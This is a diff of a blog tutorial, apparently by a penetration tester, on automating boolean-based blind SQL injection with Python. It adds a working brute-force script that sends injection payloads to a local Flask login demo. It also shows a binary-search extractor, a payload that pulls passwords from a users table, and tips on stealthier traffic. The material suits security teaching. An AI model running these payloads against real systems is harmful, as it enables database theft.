@@ -15,7 +15,14 @@ preamble: |
 
 When performing a penetration test, we occasionally come across SQL injection (SQLi) vulnerabilities. One particular class of SQLi is particularly tedious to manually exploit — Boolean-Based SQLi.
 
-Tedious, heavily-repetitive tasks often present themselves as nice opportunities for automation. In this post, we’ll review Boolean-Based SQL Injection, and explore how to automate it with Python by starting with a basic script, optimising, applying multithreading, and more.
+Tedious, heavily-repetitive tasks often present themselves as nice opportunities for automation. In this post, we’ll review Boolean-Based SQL Injection, and explore how to automate it with Python by starting with a basic script, optimising, applying multithreading, and more. We'll mainly focus on high-level approaches towards automation and keep our code snippets short.
+
+The end result is a script which automates network requests and brute-forcing into a nice interface:
+
+{% video "assets/hkirc-ctf-2024-demo.mp4", "w-100" %}
+
+<sup>Demo of the Python script in a CTF challenge.</sup>{.caption}
+
 
 ## What is Boolean-Based Blind SQL Injection?
 
@@ -43,7 +50,7 @@ By comparing the values with **ASCII numbers**, we can determine the character s
 
 So what does this look like practically?
 
-Here we have a simple Flask server with an in-memory SQLite database containing a `login` endpoint. We'll only focus on the `login()` function. (Full code is [uploaded on GitHub](https://github.com/TrebledJ/bsqli.py/blob/89e06c708d8a3be4afca6efcddff69097934d0df/demo/server.py) for reference.)
+Here we have a simple Flask server with an in-memory SQLite database containing a `login` endpoint. The `login()` function is simple: check if the username and password exists in the DB. If it exists, then login is successful.^[Full code for the Flask + SQLite demo is [uploaded on GitHub](https://github.com/TrebledJ/bsqli.py/blob/89e06c708d8a3be4afca6efcddff69097934d0df/demo/server.py) for reference.]
 
 
 ```python
@@ -74,13 +81,47 @@ where everything after `--` is treated as a comment.
 
 Since `1=1` is always true, all users will be selected, and the page returns: "Login successful".
 
-{% image "assets/login-success.png", "", "Basic Proof-of-Concept showing a *TRUE*/*FALSE* response from our demo server." %}
+{% image "assets/login-success.png", "", "Basic Proof-of-Concept showing a TRUE/FALSE response from our demo server." %}
 
 Using this, we can detect *TRUE* responses by checking if the body contains "success".
 
 {% image "https://imageio.forbes.com/specials-images/imageserve/5f9875237283b142dc3c7f2d/Sacha-Baron-Cohen-in-Amazon-s--Borat-Subsequent-Moviefilm-/960x0.png?format=png&width=960", "w-60", "Great success!" %}
 
-Moreover, we can leak further information by changing `1=1` to other guessy queries. For instance, we can use this bad boy — `UNICODE(SUBSTRING(sqlite_version(), 1, 1))=51` — to test if the first character of `sqlite_version()` is `3`. This is where the tedious part comes in: we need to scan two directions: the index and the ASCII character. Scripting helps eliminate the manual labour (and make it fun in the process).
+Moreover, we can leak further information by changing `1=1` to other guessy queries. For instance, we can use this bad boy — `UNICODE(SUBSTRING(sqlite_version(), 1, 1))=51` — to test if the first character of `sqlite_version()` is `'3'`. This is where the tedious part comes in: we need to scan two variables: the index and the ASCII character. Scripting helps eliminate this manual labour.
+
+We can use this simple script to brute-force the remaining characters:
+
+```python
+import requests
+
+def check_sql_value(sql_query: str, idx: int, guess: int) -> bool:
+    url = 'http://127.0.0.1:5000/login'
+    data = {
+        'username': '1',
+        'password': f"' OR UNICODE(SUBSTRING({sql_query}, {idx}, 1)) = {guess} -- "
+    }
+    r = requests.post(url, data=data)
+    return 'success' in r.text
+
+max_data_len = 256
+final_data = ''
+
+# SQL's SUBSTRING uses 1-based indexing.
+for idx in range(1, max_data_len):
+    for guess in range(1, 128):
+        if check_sql_value('sqlite_version()', idx, guess):
+            final_data += chr(guess)
+            print(final_data)
+            break
+    else:
+        # No valid ASCII chars found. Probably end of string.
+        break
+```
+
+Output:
+
+{% image "assets/brute-sqlite-version.png", "w-70", "We successfully determined the SQLite Version: 3.41.2." %}
+
 
 {% enddetails %}
 
@@ -91,7 +132,7 @@ One quick and simple optimisation whenever we’re searching an ordered sequence
 
 This is a good thing for real life engagements: fewer iterations → less traffic → more sneaky → better opsec.
 
-Normally, binary search relies on three outputs for a test: equals, less-than, and greater-than. But it is possible to make do with just two outputs: less-than, and greater-than-or-equals. If it’s less, we eliminate the upper half; otherwise, we eliminate the lower half.
+Normally, binary search relies on three possible outputs for a test: `=`, `<`, and `>`. But it is possible to make do with just two possible outputs: `<` and `>=`. If it’s less, we eliminate the upper half; otherwise, we eliminate the lower half.
 
 ```python
 def binary_search(val: int, low: int, high: int) -> int:
@@ -126,7 +167,7 @@ result: 125
 In the code snippets above, `val` is known for demo purposes. But in reality, `val` is unknown; it’s the data we’re trying to exfiltrate. To be more realistic, let's replace the `val` comparisons with a function `check_sql_value()` which sends network requests.
 
 ```python
-def binary_search(sql_query: str, low: int, high: int) -> int:
+def binary_search(sql_query: str, idx: int, low: int, high: int) -> int:
     """Find the value of sql_query using binary search, between
     low (inclusive) and high (exclusive). Assuming the guessed value
     is within range."""
@@ -135,21 +176,25 @@ def binary_search(sql_query: str, low: int, high: int) -> int:
         if low == mid:
             return mid # Found val.
         
-        if check_sql_value(sql_query, mid):
+        if check_sql_value(sql_query, idx, mid):
             high = mid
         else:
             low = mid
 
-def check_sql_value(sql_query: str, n: int) -> bool:
-    # Make web request to check sql_query < n.
+def check_sql_value(sql_query: str, idx: int, guess: int) -> bool:
+    # Make web request to check ASCII(SUBSTRING(sql_query, idx, 1)) < guess.
     # And then check if the response is a TRUE or FALSE response.
     ...
+
+for idx in range(1, 256):
+    val = binary_search("@@version", idx, 0, 128)
+    # Handle `val`...
 ```
 
-The idea here is we can pass an SQL query, such as `ASCII(SUBSTRING(@@version, 1, 1))`, followed by the expected ranged.
+The idea here is we can pass an SQL query, such as `@@version` or `sqlite_version()`, followed by the index and expected ranged.
 
 ```python
-binary_search("ASCII(SUBSTRING(@@version, 1, 1))", low, high)
+binary_search("@@version", idx, low, high)
 ```
 
 We can make the code more generic or flexible, but the underlying idea is there.
@@ -159,7 +204,7 @@ We can make the code more generic or flexible, but the underlying idea is there.
 Not all types of data are easy to exfiltrate. Here are some tricks I've picked up (some of which could be scripted):
 
 - Use subqueries to select data from arbitrary tables.
-    - e.g. `ASCII(SUBSTRING( (SELECT password FROM users LIMIT 1 OFFSET 5), 1, 1 ))`
+    - e.g. `ASCII(SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 5), 1, 1))`
 - Use `GROUP_CONCAT` to combine multiple rows into one row. This function is available in MySQL and SQLite.
     - Subqueries only work when 1 row and 1 column is selected.
     - Occasionally, there is a *lot* of data across multiple rows.
@@ -169,13 +214,12 @@ Not all types of data are easy to exfiltrate. Here are some tricks I've picked u
     - e.g. `CAST(id AS VARCHAR(32))` in MySQL
     - Cast with `NULL`, may not work. Additional `NULL`-checks may be needed.
 
-I later realised — some of these are also used by SQLmap, a popular automatic SQL enumeration/exploitation script.
 
 ## Adding Multithreading
 
 Now that we've optimised the reading of a single character, can we also speed up the reading of an entire string?
 
-Parallelism to the rescue! For this, we'll reach for Python's built-in `concurrent.futures` library, which provides several high-level threading tools. The choice boils down to using threads (via `ThreadPoolExecutor`) or processes (`ProcessPoolExecutor`), and considering how data/processing is distributed.
+Yes! Thanks to concurrency! For this, we'll reach for Python's built-in `concurrent.futures` library, which provides several high-level threading tools. The choice boils down to using threads (via `ThreadPoolExecutor`) or processes (`ProcessPoolExecutor`), and considering how data/processing is distributed.
 
 ### Threads vs. Processes
 
@@ -193,7 +237,7 @@ Processes:
 - each process has their own GIL
 - recommended for CPU-bound tasks (intense computations, calculations)
 
-Note: The GIL is being actively developed and may change in Python 3.13+, so expect some updates in the (concurrent.) future.
+Note: GIL behaviour may change in Python 3.13+, so expect some updates in the (concurrent.)future.
 
 Reference: [StackOverflow – Multiprocessing vs. Threading in Python](https://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python)
 
@@ -271,6 +315,21 @@ Instead of modifying the shell command on each SQL change, it would be nice to h
 - [`prompt_toolkit`](https://github.com/prompt-toolkit/python-prompt-toolkit)
     - Has the usual terminal shortcuts: up, down, reverse search `^r`.
     - Command history can be stored in a file so that it persists across runs.
+
+The implementation is as simple as replacing `input()` with `prompt.prompt()`.
+
+Before:
+
+```python
+sql = input("sqli> ")
+```
+
+After:
+
+```python
+prompt = PromptSession(history=FileHistory(".history"))
+sql = prompt.prompt("sqli> ")
+```
 
 
 ## Conclusion
